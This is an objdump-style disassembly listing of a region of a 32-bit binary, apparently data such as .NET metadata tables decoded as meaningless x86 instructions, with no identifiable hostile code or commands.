10005c77:	00 91 18 e5 05 39    	add    %dl,0x3905e518(%ecx)
10005c7d:	00 14 00             	add    %dl,(%eax,%eax,1)
10005c80:	00 00                	add    %al,(%eax)
10005c82:	00 00                	add    %al,(%eax)
10005c84:	80 00 91             	addb   $0x91,(%eax)
10005c87:	20 09                	and    %cl,(%ecx)
10005c89:	01 4e 00             	add    %ecx,0x0(%esi)
10005c8c:	14 00                	adc    $0x0,%al
10005c8e:	00 00                	add    %al,(%eax)
10005c90:	00 00                	add    %al,(%eax)
10005c92:	80 00 91             	addb   $0x91,(%eax)
10005c95:	20 0f                	and    %cl,(%edi)
10005c97:	01 53 00             	add    %edx,0x0(%ebx)
10005c9a:	15 00 00 00 00       	adc    $0x0,%eax
10005c9f:	00 80 00 91 20 19    	add    %al,0x19209100(%eax)
10005ca5:	01 4e 00             	add    %ecx,0x0(%esi)
10005ca8:	17                   	pop    %ss
10005ca9:	00 00                	add    %al,(%eax)
10005cab:	00 00                	add    %al,(%eax)
10005cad:	00 80 00 91 20 2c    	add    %al,0x2c209100(%eax)
10005cb3:	01 59 00             	add    %ebx,0x0(%ecx)
10005cb6:	18 00                	sbb    %al,(%eax)
10005cb8:	00 00                	add    %al,(%eax)
10005cba:	00 00                	add    %al,(%eax)
10005cbc:	80 00 91             	addb   $0x91,(%eax)
10005cbf:	20 43 01             	and    %al,0x1(%ebx)
10005cc2:	60                   	pusha
10005cc3:	00 1b                	add    %bl,(%ebx)
10005cc5:	00 00                	add    %al,(%eax)
10005cc7:	00 00                	add    %al,(%eax)
10005cc9:	00 80 00 91 20 50    	add    %al,0x50209100(%eax)
10005ccf:	01 66 00             	add    %esp,0x0(%esi)
10005cd2:	1d 00 00 00 00       	sbb    $0x0,%eax
10005cd7:	00 80 00 91 20 57    	add    %al,0x57209100(%eax)
10005cdd:	01 73 00             	add    %esi,0x0(%ebx)
10005ce0:	26 00 00             	add    %al,%es:(%eax)
10005ce3:	00 00                	add    %al,(%eax)
10005ce5:	00 80 00 91 20 64    	add    %al,0x64209100(%eax)
10005ceb:	01 73 00             	add    %esi,0x0(%ebx)
10005cee:	27                   	daa
10005cef:	00 d4                	add    %dl,%ah
10005cf1:	21 00                	and    %eax,(%eax)
10005cf3:	00 00                	add    %al,(%eax)
10005cf5:	00 96 00 83 01 81    	add    %dl,-0x7efe7d00(%esi)
10005cfb:	00 28                	add    %ch,(%eax)
10005cfd:	00 43 22             	add    %al,0x22(%ebx)
10005d00:	00 00                	add    %al,(%eax)
10005d02:	00 00                	add    %al,(%eax)
10005d04:	86 18                	xchg   %bl,(%eax)
10005d06:	f0 00 3d 00 2a 00 00 	lock add %bh,0x2a00
10005d0d:	00 00                	add    %al,(%eax)
10005d0f:	00 80 00 91 20 8c    	add    %al,-0x73df6f00(%eax)
10005d15:	01 88 00 2a 00 00    	add    %ecx,0x2a00(%eax)
10005d1b:	00 00                	add    %al,(%eax)
10005d1d:	00 80 00 91 20 ba    	add    %al,-0x45df6f00(%eax)
10005d23:	01 8c 00 2a 00 00 00 	add    %ecx,0x2a(%eax,%eax,1)
10005d2a:	00 00                	add    %al,(%eax)
10005d2c:	80 00 91             	addb   $0x91,(%eax)
10005d2f:	20 c8                	and    %cl,%al
10005d31:	01 94 00 2d 00 00 00 	add    %edx,0x2d(%eax,%eax,1)
10005d38:	00 00                	add    %al,(%eax)
10005d3a:	80 00 91             	addb   $0x91,(%eax)
10005d3d:	20 dc                	and    %bl,%ah
10005d3f:	01 99 00 2e 00 4c    	add    %ebx,0x4c002e00(%ecx)
10005d45:	22 00                	and    (%eax),%al
10005d47:	00 00                	add    %al,(%eax)
10005d49:	00 96 00 f5 01 a0    	add    %dl,-0x5ffe0b00(%esi)
10005d4f:	00 30                	add    %dh,(%eax)
10005d51:	00 c4                	add    %al,%ah
10005d53:	22 00                	and    (%eax),%al
10005d55:	00 00                	add    %al,(%eax)
10005d57:	00 96 00 04 02 a0    	add    %dl,-0x5ffdfc00(%esi)
10005d5d:	00 30                	add    %dh,(%eax)
10005d5f:	00 2c 23             	add    %ch,(%ebx,%eiz,1)
10005d62:	00 00                	add    %al,(%eax)
10005d64:	00 00                	add    %al,(%eax)
10005d66:	86 18                	xchg   %bl,(%eax)
10005d68:	f0 00 3d 00 30 00 00 	lock add %bh,0x3000
10005d6f:	00 00                	add    %al,(%eax)
10005d71:	00 80 00 91 20 15    	add    %al,0x15209100(%eax)
10005d77:	02 a4 00 30 00 00 00 	add    0x30(%eax,%eax,1),%ah
10005d7e:	00 00                	add    %al,(%eax)
10005d80:	80 00 91             	addb   $0x91,(%eax)
10005d83:	20 26                	and    %ah,(%esi)
10005d85:	02 a4 00 31 00 34 23 	add    0x23340031(%eax,%eax,1),%ah
10005d8c:	00 00                	add    %al,(%eax)
10005d8e:	00 00                	add    %al,(%eax)
10005d90:	96                   	xchg   %eax,%esi
10005d91:	00 d7                	add    %dl,%bh
10005d93:	02 39                	add    (%ecx),%bh
10005d95:	00 32                	add    %dh,(%edx)
10005d97:	00 a4 23 00 00 00 00 	add    %ah,0x0(%ebx,%eiz,1)
10005d9e:	96                   	xchg   %eax,%esi
10005d9f:	00 dd                	add    %bl,%ch
10005da1:	02 39                	add    (%ecx),%bh
10005da3:	00 32                	add    %dh,(%edx)
10005da5:	00 ec                	add    %ch,%ah
10005da7:	23 00                	and    (%eax),%eax
10005da9:	00 00                	add    %al,(%eax)
10005dab:	00 91 00 e2 02 39    	add    %dl,0x3902e200(%ecx)
10005db1:	00 32                	add    %dh,(%edx)
10005db3:	00 e8                	add    %ch,%al
10005db5:	24 00                	and    $0x0,%al
10005db7:	00 00                	add    %al,(%eax)
10005db9:	00 96 00 eb 02 39    	add    %dl,0x3902eb00(%esi)
10005dbf:	00 32                	add    %dh,(%edx)
10005dc1:	00 ac 25 00 00 00 00 	add    %ch,0x0(%ebp,%eiz,1)
10005dc8:	96                   	xchg   %eax,%esi
10005dc9:	00 f7                	add    %dh,%bh
10005dcb:	02 c4                	add    %ah,%al
10005dcd:	00 32                	add    %dh,(%edx)
10005dcf:	00 18                	add    %bl,(%eax)
10005dd1:	28 00                	sub    %al,(%eax)
10005dd3:	00 00                	add    %al,(%eax)
10005dd5:	00 96 00 02 03 c9    	add    %dl,-0x36fcfe00(%esi)
10005ddb:	00 33                	add    %dh,(%ebx)
10005ddd:	00 80 28 00 00 00    	add    %al,0x28(%eax)
10005de3:	00 96 00 12 03 ce    	add    %dl,-0x31fcee00(%esi)
10005de9:	00 33                	add    %dh,(%ebx)
10005deb:	00 21                	add    %ah,(%ecx)
10005ded:	2a 00                	sub    (%eax),%al
10005def:	00 00                	add    %al,(%eax)
10005df1:	00 86 18 f0 00 3d    	add    %al,0x3d00f018(%esi)
10005df7:	00 34 00             	add    %dh,(%eax,%eax,1)
10005dfa:	cc                   	int3
10005dfb:	29 00                	sub    %eax,(%eax)
10005dfd:	00 00                	add    %al,(%eax)
10005dff:	00 91 18 e5 05 39    	add    %dl,0x3905e518(%ecx)
10005e05:	00 34 00             	add    %dh,(%eax,%eax,1)
10005e08:	00 00                	add    %al,(%eax)
10005e0a:	00 00                	add    %al,(%eax)
10005e0c:	80 00 96             	addb   $0x96,(%eax)
10005e0f:	20 4d 03             	and    %cl,0x3(%ebp)
10005e12:	e2 00                	loop   0x10005e14
10005e14:	34 00                	xor    $0x0,%al
10005e16:	00 00                	add    %al,(%eax)
10005e18:	00 00                	add    %al,(%eax)
10005e1a:	80 00 96             	addb   $0x96,(%eax)
10005e1d:	20 66 03             	and    %ah,0x3(%esi)
10005e20:	e8 00 36 00 00       	call   0x10009425
10005e25:	00 00                	add    %al,(%eax)
10005e27:	00 80 00 96 20 74    	add    %al,0x74209600(%eax)
10005e2d:	03 ef                	add    %edi,%ebp
10005e2f:	00 39                	add    %bh,(%ecx)
10005e31:	00 00                	add    %al,(%eax)
10005e33:	00 00                	add    %al,(%eax)
10005e35:	00 80 00 96 20 82    	add    %al,-0x7ddf6a00(%eax)
10005e3b:	03 f5                	add    %ebp,%esi
10005e3d:	00 3b                	add    %bh,(%ebx)
10005e3f:	00 00                	add    %al,(%eax)
10005e41:	00 00                	add    %al,(%eax)
10005e43:	00 80 00 96 20 8f    	add    %al,-0x70df6a00(%eax)
10005e49:	03 73 00             	add    0x0(%ebx),%esi
10005e4c:	42                   	inc    %edx
10005e4d:	00 00                	add    %al,(%eax)
10005e4f:	00 00                	add    %al,(%eax)
10005e51:	00 80 00 96 20 a3    	add    %al,-0x5cdf6a00(%eax)
10005e57:	03 73 00             	add    0x0(%ebx),%esi
10005e5a:	43                   	inc    %ebx
10005e5b:	00 00                	add    %al,(%eax)
10005e5d:	00 00                	add    %al,(%eax)
10005e5f:	00 80 00 96 20 dc    	add    %al,-0x23df6a00(%eax)
10005e65:	01 00                	add    %eax,(%eax)
10005e67:	01 44 00 00          	add    %eax,0x0(%eax,%eax,1)
10005e6b:	00 00                	add    %al,(%eax)
10005e6d:	00 80 00 96 20 8c    	add    %al,-0x73df6a00(%eax)
10005e73:	01 88 00 46 00 00    	add    %ecx,0x4600(%eax)
10005e79:	00 00                	add    %al,(%eax)
10005e7b:	00 80 00 96 20 b4    	add    %al,-0x4bdf6a00(%eax)
10005e81:	03 06                	add    (%esi),%eax
10005e83:	01 46 00             	add    %eax,0x0(%esi)
10005e86:	00 00                	add    %al,(%eax)
10005e88:	00 00                	add    %al,(%eax)
10005e8a:	80 00 96             	addb   $0x96,(%eax)
10005e8d:	20 c6                	and    %al,%dh
10005e8f:	03 0d 01 49 00 29    	add    0x29004901,%ecx
10005e95:	2a 00                	sub    (%eax),%al
10005e97:	00 00                	add    %al,(%eax)
10005e99:	00 96 08 38 04 18    	add    %dl,0x18043808(%esi)
10005e9f:	01 49 00             	add    %ecx,0x0(%ecx)
10005ea2:	34 2a                	xor    $0x2a,%al
10005ea4:	00 00                	add    %al,(%eax)
10005ea6:	00 00                	add    %al,(%eax)
10005ea8:	91                   	xchg   %eax,%ecx
10005ea9:	00 45 04             	add    %al,0x4(%ebp)
10005eac:	1c 01                	sbb    $0x1,%al
10005eae:	49                   	dec    %ecx
10005eaf:	00 60 2a             	add    %ah,0x2a(%eax)
10005eb2:	00 00                	add    %al,(%eax)
10005eb4:	00 00                	add    %al,(%eax)
10005eb6:	91                   	xchg   %eax,%ecx
10005eb7:	00 56 04             	add    %dl,0x4(%esi)
10005eba:	1c 01                	sbb    $0x1,%al
10005ebc:	4a                   	dec    %edx
10005ebd:	00 c4                	add    %al,%ah
10005ebf:	55                   	push   %ebp
10005ec0:	00 00                	add    %al,(%eax)
10005ec2:	00 00                	add    %al,(%eax)
10005ec4:	96                   	xchg   %eax,%esi
10005ec5:	00 63 04             	add    %ah,0x4(%ebx)
10005ec8:	2f                   	das
10005ec9:	00 4b 00             	add    %cl,0x0(%ebx)
10005ecc:	80 56 00 00          	adcb   $0x0,0x0(%esi)
10005ed0:	00 00                	add    %al,(%eax)
10005ed2:	96                   	xchg   %eax,%esi
10005ed3:	00 68 04             	add    %ch,0x4(%eax)
10005ed6:	39 00                	cmp    %eax,(%eax)
10005ed8:	4c                   	dec    %esp
10005ed9:	00 63 57             	add    %ah,0x57(%ebx)
10005edc:	00 00                	add    %al,(%eax)
10005ede:	00 00                	add    %al,(%eax)
10005ee0:	86 18                	xchg   %bl,(%eax)
10005ee2:	f0 00 3d 00 4c 00 e8 	lock add %bh,0xe8004c00
10005ee9:	37                   	aaa
10005eea:	00 00                	add    %al,(%eax)
10005eec:	00 00                	add    %al,(%eax)
10005eee:	91                   	xchg   %eax,%ecx
10005eef:	00 ba 09 39 00 4c    	add    %bh,0x4c003909(%edx)
10005ef5:	00 cc                	add    %cl,%ah
10005ef7:	35 00 00 00 00       	xor    $0x0,%eax
10005efc:	91                   	xchg   %eax,%ecx
10005efd:	00 01                	add    %al,(%ecx)
10005eff:	0a 24 02             	or     (%edx,%eax,1),%ah
10005f02:	4c                   	dec    %esp
10005f03:	00 b4 37 00 00 00 00 	add    %dh,0x0(%edi,%esi,1)
10005f0a:	91                   	xchg   %eax,%ecx
10005f0b:	00 4b 0a             	add    %cl,0xa(%ebx)
10005f0e:	31 02                	xor    %eax,(%edx)
10005f10:	4e                   	dec    %esi
10005f11:	00 4c 56 00          	add    %cl,0x0(%esi,%edx,2)
10005f15:	00 00                	add    %al,(%eax)
10005f17:	00 91 00 9a 0e 39    	add    %dl,0x390e9a00(%ecx)
10005f1d:	00 50 00             	add    %dl,0x0(%eax)
10005f20:	34 57                	xor    $0x57,%al
10005f22:	00 00                	add    %al,(%eax)
10005f24:	00 00                	add    %al,(%eax)
10005f26:	91                   	xchg   %eax,%ecx
10005f27:	18 e5                	sbb    %ah,%ch
10005f29:	05 39 00 50 00       	add    $0x500039,%eax
10005f2e:	7a 2a                	jp     0x10005f5a
10005f30:	00 00                	add    %al,(%eax)
10005f32:	00 00                	add    %al,(%eax)
10005f34:	86 18                	xchg   %bl,(%eax)
10005f36:	f0 00 3d 00 50 00 8c 	lock add %bh,0x8c005000
10005f3d:	2a 00                	sub    (%eax),%al
10005f3f:	00 00                	add    %al,(%eax)
10005f41:	00 86 00 7b 08 f7    	add    %al,-0x8f78500(%esi)
10005f47:	01 50 00             	add    %edx,0x0(%eax)
10005f4a:	94                   	xchg   %eax,%esp
10005f4b:	2b 00                	sub    (%eax),%eax
10005f4d:	00 00                	add    %al,(%eax)
10005f4f:	00 86 00 86 08 f7    	add    %al,-0x8f77a00(%esi)
10005f55:	01 52 00             	add    %edx,0x0(%edx)
10005f58:	b0 32                	mov    $0x32,%al
10005f5a:	00 00                	add    %al,(%eax)
10005f5c:	00 00                	add    %al,(%eax)
10005f5e:	86 00                	xchg   %al,(%eax)
10005f60:	9b                   	fwait
10005f61:	08 fe                	or     %bh,%dh
10005f63:	01 54 00 e0          	add    %edx,-0x20(%eax,%eax,1)
10005f67:	35 00 00 00 00       	xor    $0x0,%eax
10005f6c:	86 00                	xchg   %al,(%eax)
10005f6e:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
10005f6f:	08 fe                	or     %bh,%dh
10005f71:	01 56 00             	add    %edx,0x0(%esi)
10005f74:	82 2a 00             	subb   $0x0,(%edx)
10005f77:	00 00                	add    %al,(%eax)
10005f79:	00 86 18 f0 00 3d    	add    %al,0x3d00f018(%esi)
10005f7f:	00 58 00             	add    %bl,0x0(%eax)
10005f82:	9c                   	pushf
10005f83:	2c 00                	sub    $0x0,%al
10005f85:	00 00                	add    %al,(%eax)
10005f87:	00 86 00 99 09 f7    	add    %al,-0x8f66700(%esi)
10005f8d:	01 58 00             	add    %ebx,0x0(%eax)
10005f90:	8c 2d 00 00 00 00    	mov    %gs,0x0
10005f96:	86 00                	xchg   %al,(%eax)
10005f98:	a4                   	movsb  %ds:(%esi),%es:(%edi)
10005f99:	09 fe                	or     %edi,%esi
10005f9b:	01 5a 00             	add    %ebx,0x0(%edx)
10005f9e:	c4 2e                	les    (%esi),%ebp
10005fa0:	00 00                	add    %al,(%eax)
10005fa2:	00 00                	add    %al,(%eax)
10005fa4:	86 00                	xchg   %al,(%eax)
10005fa6:	af                   	scas   %es:(%edi),%eax
10005fa7:	09 fe                	or     %edi,%esi
10005fa9:	01 5c 00 00          	add    %ebx,0x0(%eax,%eax,1)
10005fad:	00 01                	add    %al,(%ecx)
10005faf:	00 76 04             	add    %dh,0x4(%esi)
10005fb2:	00 00                	add    %al,(%eax)
10005fb4:	02 00                	add    (%eax),%al
10005fb6:	78 04                	js     0x10005fbc
10005fb8:	00 00                	add    %al,(%eax)
10005fba:	01 00                	add    %eax,(%eax)
10005fbc:	7a 04                	jp     0x10005fc2
10005fbe:	00 00                	add    %al,(%eax)
10005fc0:	02 00                	add    (%eax),%al
10005fc2:	7c 04                	jl     0x10005fc8
10005fc4:	00 00                	add    %al,(%eax)
10005fc6:	03 00                	add    (%eax),%eax
10005fc8:	7e 04                	jle    0x10005fce
10005fca:	00 00                	add    %al,(%eax)
10005fcc:	04 00                	add    $0x0,%al
10005fce:	80 04 00 00          	addb   $0x0,(%eax,%eax,1)
10005fd2:	05 00 82 04 00       	add    $0x48200,%eax
10005fd7:	00 01                	add    %al,(%ecx)
10005fd9:	00 84 04 00 00 02 00 	add    %al,0x20000(%esp,%eax,1)
10005fe0:	87 04 00             	xchg   %eax,(%eax,%eax,1)
10005fe3:	00 03                	add    %al,(%ebx)
10005fe5:	00 7a 04             	add    %bh,0x4(%edx)
10005fe8:	00 00                	add    %al,(%eax)
10005fea:	04 00                	add    $0x0,%al
10005fec:	82 04 00 00          	addb   $0x0,(%eax,%eax,1)
10005ff0:	01 00                	add    %eax,(%eax)
10005ff2:	89 04 00             	mov    %eax,(%eax,%eax,1)
10005ff5:	00 01                	add    %al,(%ecx)
10005ff7:	00 7c 04 00          	add    %bh,0x0(%esp,%eax,1)
10005ffb:	00 02                	add    %al,(%edx)
10005ffd:	00 7e 04             	add    %bh,0x4(%esi)
10006000:	00 00                	add    %al,(%eax)
10006002:	01 00                	add    %eax,(%eax)
10006004:	92                   	xchg   %eax,%edx
10006005:	04 00                	add    $0x0,%al
10006007:	00 01                	add    %al,(%ecx)
10006009:	00 92 04 00 00 01    	add    %dl,0x1000004(%edx)
1000600f:	00 80 04 00 00 01    	add    %al,0x1000004(%eax)
10006015:	00 84 04 00 00 01 00 	add    %al,0x10000(%esp,%eax,1)
1000601c:	84 04 00             	test   %al,(%eax,%eax,1)
1000601f:	00 01                	add    %al,(%ecx)
10006021:	00 94 04 00 00 01 00 	add    %dl,0x10000(%esp,%eax,1)
10006028:	94                   	xchg   %eax,%esp
10006029:	04 00                	add    $0x0,%al
1000602b:	00 02                	add    %al,(%edx)
1000602d:	00 99 04 00 00 01    	add    %bl,0x1000004(%ecx)
10006033:	00 99 04 00 00 01    	add    %bl,0x1000004(%ecx)
10006039:	00 99 04 00 00 02    	add    %bl,0x2000004(%ecx)
1000603f:	00 9d 04 00 00 03    	add    %bl,0x3000004(%ebp)
10006045:	00 9f 04 00 00 01    	add    %bl,0x1000004(%edi)
1000604b:	00 99 04 00 00 02    	add    %bl,0x2000004(%ecx)
10006051:	00 a1 04 00 00 01    	add    %ah,0x1000004(%ecx)
10006057:	00 a5 04 00 00 02    	add    %ah,0x2000004(%ebp)
1000605d:	00 7c 04 00          	add    %bh,0x0(%esp,%eax,1)
10006061:	00 03                	add    %al,(%ebx)
10006063:	00 7e 04             	add    %bh,0x4(%esi)
10006066:	00 00                	add    %al,(%eax)
10006068:	04 00                	add    $0x0,%al
1000606a:	9d                   	popf
1000606b:	04 00                	add    $0x0,%al
1000606d:	00 05 00 9f 04 00    	add    %al,0x49f00
10006073:	00 06                	add    %al,(%esi)
10006075:	00 ad 04 00 00 07    	add    %ch,0x7000004(%ebp)
1000607b:	00 b4 04 00 00 08 00 	add    %dh,0x80000(%esp,%eax,1)
10006082:	b7 04                	mov    $0x4,%bh
10006084:	00 00                	add    %al,(%eax)
10006086:	09 00                	or     %eax,(%eax)
10006088:	ba 04 00 00 01       	mov    $0x1000004,%edx
1000608d:	00 a1 04 00 00 01    	add    %ah,0x1000004(%ecx)
10006093:	00 99 04 00 00 01    	add    %bl,0x1000004(%ecx)
10006099:	00 bd 04 00 00 02    	add    %bh,0x2000004(%ebp)
1000609f:	00 c3                	add    %al,%bl
100060a1:	04 00                	add    $0x0,%al
100060a3:	00 01                	add    %al,(%ecx)
100060a5:	00 ca                	add    %cl,%dl
100060a7:	04 00                	add    $0x0,%al
100060a9:	00 02                	add    %al,(%edx)
100060ab:	00 cf                	add    %cl,%bh
100060ad:	04 00                	add    $0x0,%al
100060af:	00 03                	add    %al,(%ebx)
100060b1:	00 d4                	add    %dl,%ah
100060b3:	04 00                	add    $0x0,%al
100060b5:	00 01                	add    %al,(%ecx)
100060b7:	00 ca                	add    %cl,%dl
100060b9:	04 00                	add    $0x0,%al
100060bb:	00 01                	add    %al,(%ecx)
100060bd:	00 ca                	add    %cl,%dl
100060bf:	04 02                	add    $0x2,%al
100060c1:	00 02                	add    %al,(%edx)
100060c3:	00 da                	add    %bl,%dl
100060c5:	04 00                	add    $0x0,%al
100060c7:	00 01                	add    %al,(%ecx)
100060c9:	00 10                	add    %dl,(%eax)
100060cb:	05 00 00 01 00       	add    $0x10000,%eax
100060d0:	10 05 00 00 01 00    	adc    %al,0x10000
100060d6:	15 05 00 00 01       	adc    $0x1000005,%eax
100060db:	00 15 05 00 00 01    	add    %dl,0x1000005
100060e1:	00 94 04 00 00 02 00 	add    %dl,0x20000(%esp,%eax,1)
100060e8:	1c 05                	sbb    $0x5,%al
100060ea:	00 00                	add    %al,(%eax)
100060ec:	01 00                	add    %eax,(%eax)
100060ee:	ca 04 00             	lret   $0x4
100060f1:	00 02                	add    %al,(%edx)
100060f3:	00 27                	add    %ah,(%edi)
100060f5:	05 00 00 03 00       	add    $0x30000,%eax
100060fa:	2e 05 00 00 01 00    	cs add $0x10000,%eax
10006100:	ca 04 00             	lret   $0x4
10006103:	00 02                	add    %al,(%edx)
10006105:	00 27                	add    %ah,(%edi)
10006107:	05 00 00 01 00       	add    $0x10000,%eax
1000610c:	ca 04 00             	lret   $0x4
1000610f:	00 02                	add    %al,(%edx)
10006111:	00 38                	add    %bh,(%eax)
10006113:	05 00 00 03 00       	add    $0x30000,%eax
10006118:	76 04                	jbe    0x1000611e
1000611a:	00 00                	add    %al,(%eax)
1000611c:	04 00                	add    $0x0,%al
1000611e:	78 04                	js     0x10006124
10006120:	00 00                	add    %al,(%eax)
10006122:	05 00 48 05 00       	add    $0x54800,%eax
10006127:	00 06                	add    %al,(%esi)
10006129:	00 4b 05             	add    %cl,0x5(%ebx)
1000612c:	00 00                	add    %al,(%eax)
1000612e:	07                   	pop    %es
1000612f:	00 4e 05             	add    %cl,0x5(%esi)
10006132:	00 00                	add    %al,(%eax)
10006134:	01 00                	add    %eax,(%eax)
10006136:	ca 04 00             	lret   $0x4
10006139:	00 01                	add    %al,(%ecx)
1000613b:	00 ca                	add    %cl,%dl
1000613d:	04 00                	add    $0x0,%al
1000613f:	00 01                	add    %al,(%ecx)
10006141:	00 ca                	add    %cl,%dl
10006143:	04 00                	add    $0x0,%al
10006145:	00 02                	add    %al,(%edx)
10006147:	00 55 05             	add    %dl,0x5(%ebp)
1000614a:	00 00                	add    %al,(%eax)
1000614c:	01 00                	add    %eax,(%eax)
1000614e:	5f                   	pop    %edi
1000614f:	05 00 00 02 00       	add    $0x20000,%eax
10006154:	68 05 00 00 03       	push   $0x3000005
10006159:	00 73 05             	add    %dh,0x5(%ebx)
1000615c:	00 00                	add    %al,(%eax)
1000615e:	01 00                	add    %eax,(%eax)
10006160:	94                   	xchg   %eax,%esp
10006161:	04 00                	add    $0x0,%al
10006163:	00 01                	add    %al,(%ecx)
10006165:	00 94 04 00 00 01 00 	add    %dl,0x10000(%esp,%eax,1)
1000616c:	7b 05                	jnp    0x10006173
1000616e:	00 00                	add    %al,(%eax)
10006170:	01 00                	add    %eax,(%eax)
10006172:	87 04 00             	xchg   %eax,(%eax,%eax,1)
10006175:	00 02                	add    %al,(%edx)
10006177:	00 82 04 00 00 01    	add    %al,0x1000004(%edx)
1000617d:	00 87 04 00 00 02    	add    %al,0x2000004(%edi)
10006183:	00 56 0a             	add    %dl,0xa(%esi)
10006186:	00 00                	add    %al,(%eax)
10006188:	01 00                	add    %eax,(%eax)
1000618a:	b1 08                	mov    $0x8,%cl
1000618c:	00 00                	add    %al,(%eax)
1000618e:	02 00                	add    (%eax),%al
10006190:	82 04 00 00          	addb   $0x0,(%eax,%eax,1)
10006194:	01 00                	add    %eax,(%eax)
10006196:	b1 08                	mov    $0x8,%cl
10006198:	00 00                	add    %al,(%eax)
1000619a:	02 00                	add    (%eax),%al
1000619c:	82 04 00 00          	addb   $0x0,(%eax,%eax,1)
100061a0:	01 00                	add    %eax,(%eax)
100061a2:	87 04 00             	xchg   %eax,(%eax,%eax,1)
100061a5:	00 02                	add    %al,(%edx)
100061a7:	00 82 04 00 00 01    	add    %al,0x1000004(%edx)
100061ad:	00 87 04 00 00 02    	add    %al,0x2000004(%edi)
100061b3:	00 82 04 00 00 01    	add    %al,0x1000004(%edx)
100061b9:	00 b1 08 00 00 02    	add    %dh,0x2000008(%ecx)
100061bf:	00 82 04 00 00 01    	add    %al,0x1000004(%edx)
100061c5:	00 87 04 00 00 02    	add    %al,0x2000004(%edi)
100061cb:	00 82 04 00 00 01    	add    %al,0x1000004(%edx)
100061d1:	00 87 04 00 00 02    	add    %al,0x2000004(%edi)
100061d7:	00 82 04 41 00 f0    	add    %al,-0xfffbefc(%edx)
100061dd:	00 3d 00 49 00 f0    	add    %bh,0xf0004900
100061e3:	00 25 01 51 00 f0    	add    %ah,0xf0005101
100061e9:	00 3d 00 59 00 f0    	add    %bh,0xf0005900
100061ef:	00 2a                	add    %ch,(%edx)
100061f1:	01 09                	add    %ecx,(%ecx)
100061f3:	00 f0                	add    %dh,%al
100061f5:	00 3d 00 61 00 fd    	add    %bh,0xfd006100
100061fb:	05 11 01 69 00       	add    $0x690111,%eax
10006200:	08 06                	or     %al,(%esi)
10006202:	2f                   	das
10006203:	01 61 00             	add    %esp,0x0(%ecx)
10006206:	14 06                	adc    $0x6,%al
10006208:	3e 01 19             	add    %ebx,%ds:(%ecx)
1000620b:	00 f0                	add    %dh,%al
1000620d:	00 25 01 19 00 20    	add    %ah,0x20001901
10006213:	06                   	push   %es
10006214:	44                   	inc    %esp
10006215:	01 09                	add    %ecx,(%ecx)
10006217:	00 2d 06 48 01 71    	add    %ch,0x71014806
1000621d:	00 51 06             	add    %dl,0x6(%ecx)
10006220:	54                   	push   %esp
10006221:	01 71 00             	add    %esi,0x0(%ecx)
10006224:	60                   	pusha
10006225:	06                   	push   %es
10006226:	48                   	dec    %eax
10006227:	01 79 00             	add    %edi,0x0(%ecx)
1000622a:	f0 00 60 01          	lock add %ah,0x1(%eax)
1000622e:	29 00                	sub    %eax,(%eax)
10006230:	f0 00 66 01          	lock add %ah,0x1(%esi)
10006234:	29 00                	sub    %eax,(%eax)
10006236:	7c 06                	jl     0x1000623e
10006238:	6c                   	insb   (%dx),%es:(%edi)
10006239:	01 29                	add    %ebp,(%ecx)
1000623b:	00 9c 06 71 01 29 00 	add    %bl,0x290171(%esi,%eax,1)
10006242:	d7                   	xlat   %ds:(%ebx)
10006243:	02 3d 00 29 00 a9    	add    0xa9002900,%bh
10006249:	06                   	push   %es
1000624a:	7b 01                	jnp    0x1000624d
1000624c:	89 00                	mov    %eax,(%eax)
1000624e:	b5 06                	mov    $0x6,%ch
10006250:	80 01 91             	addb   $0x91,(%ecx)
10006253:	00 cb                	add    %cl,%bl
10006255:	06                   	push   %es
10006256:	85 01                	test   %eax,(%ecx)
10006258:	0c 00                	or     $0x0,%al
1000625a:	d1 06                	roll   $1,(%esi)
1000625c:	92                   	xchg   %eax,%edx
1000625d:	01 0c 00             	add    %ecx,(%eax,%eax,1)
10006260:	d9 06                	flds   (%esi)
10006262:	44                   	inc    %esp
10006263:	01 0c 00             	add    %ecx,(%eax,%eax,1)
10006266:	e3 06                	jecxz  0x1000626e
10006268:	98                   	cwtl
10006269:	01 91 00 eb 06 9d    	add    %edx,-0x62f91500(%ecx)
1000626f:	01 29                	add    %ebp,(%ecx)
10006271:	00 f0                	add    %dh,%al
10006273:	06                   	push   %es
10006274:	2f                   	das
10006275:	00 99 00 2d 06 48    	add    %bl,0x48062d00(%ecx)
1000627b:	01 89 00 fb 06 48    	add    %ecx,0x4806fb00(%ecx)
10006281:	01 0c 00             	add    %ecx,(%eax,%eax,1)
10006284:	03 07                	add    (%edi),%eax
10006286:	c7 01 0c 00 0b 07    	movl   $0x70b000c,(%ecx)
1000628c:	3d 00 0c 00 f0       	cmp    $0xf0000c00,%eax
10006291:	00 3d 00 b1 00 f0    	add    %bh,0xf000b100
10006297:	00 3d 00 c1 00 e3    	add    %bh,0xe300c100
1000629d:	07                   	pop    %es
1000629e:	e4 01                	in     $0x1,%al
100062a0:	e9 00 96 0a 3d       	jmp    0x4d0af8a5
100062a5:	02 19                	add    (%ecx),%bl
100062a7:	01 ca                	add    %ecx,%edx
100062a9:	0a 43 02             	or     0x2(%ebx),%al
100062ac:	29 01                	sub    %eax,(%ecx)
100062ae:	e4 0a                	in     $0xa,%al
100062b0:	44                   	inc    %esp
100062b1:	01 29                	add    %ebp,(%ecx)
100062b3:	01 ee                	add    %ebp,%esi
100062b5:	0a 44 01 31          	or     0x31(%ecx,%eax,1),%al
100062b9:	01 fe                	add    %edi,%esi
100062bb:	0a 4a 02             	or     0x2(%edx),%cl
100062be:	31 01                	xor    %eax,(%ecx)
100062c0:	02 0b                	add    (%ebx),%cl
100062c2:	4a                   	dec    %edx
100062c3:	02 f9                	add    %cl,%bh
100062c5:	00 06                	add    %al,(%esi)
100062c7:	0b 4f 02             	or     0x2(%edi),%ecx
100062ca:	39 01                	cmp    %eax,(%ecx)
100062cc:	f0 00 58 02          	lock add %bl,0x2(%eax)
100062d0:	19 01                	sbb    %eax,(%ecx)
100062d2:	20 0b                	and    %cl,(%ebx)
100062d4:	5e                   	pop    %esi
100062d5:	02 49 01             	add    0x1(%ecx),%cl
100062d8:	38 0b                	cmp    %cl,(%ebx)
100062da:	3d 00 f9 00 06       	cmp    $0x600f900,%eax
100062df:	0b 78 02             	or     0x2(%eax),%edi
100062e2:	51                   	push   %ecx
100062e3:	01 f0                	add    %esi,%eax
100062e5:	00 80 02 19 01 44    	add    %al,0x44011902(%eax)
100062eb:	0b 87 02 51 01 58    	or     0x58015102(%edi),%eax
100062f1:	0b 92 02 51 01 65    	or     0x65015102(%edx),%edx
100062f7:	0b 92 02 19 01 70    	or     0x70011902(%edx),%edx
